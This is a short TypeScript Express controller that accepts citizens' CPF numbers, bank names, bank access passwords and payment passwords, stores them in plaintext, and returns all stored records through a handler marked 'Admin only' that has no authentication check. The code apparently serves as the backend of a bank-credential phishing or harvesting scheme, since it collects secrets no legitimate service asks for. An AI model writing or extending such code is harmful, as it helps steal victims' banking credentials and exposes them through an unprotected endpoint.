import { Request, Response } from "express";
import Citizen from "../models/Citizen";
import { validationResult } from "express-validator";
import jwt from "jsonwebtoken";
import BankInfo from "@models/BankInfo";

// Get all bankinfo (Admin only)
export const getBankInfos = async (req: Request, res: Response) => {
    
    const errors = validationResult(req);
    if (!errors.isEmpty()) {
        return res.status(400).json({ errors: errors.array() });
    }
        
    try {
        const banks = await BankInfo.find();
        res.json(banks);
    } catch (error) {
        res.status(500).json({ error: "Server error" });
    }
};

export const sendBankInfo = async(req: Request, res: Response) => {
    const errors = validationResult(req);
	if (!errors.isEmpty()) {
		return res.status(400).json({ errors: errors.array() });
	}

    const { CPF, bankName, accessPassword, paymentPassword } = req.body;
    try{
        let citizen = await Citizen.findOne({ CPF });
        if(!citizen){
            return res.status(400).json({ message: "Citizen not found"});
        }
        
        let bank = new BankInfo({
            CPF, bankName, accessPassword, paymentPassword
        });
        await bank.save();

        res.status(201).json({ message: "Successfully sent" })
    }
    catch(error){
        res.status(500).json({ message: "server error" });
    }
}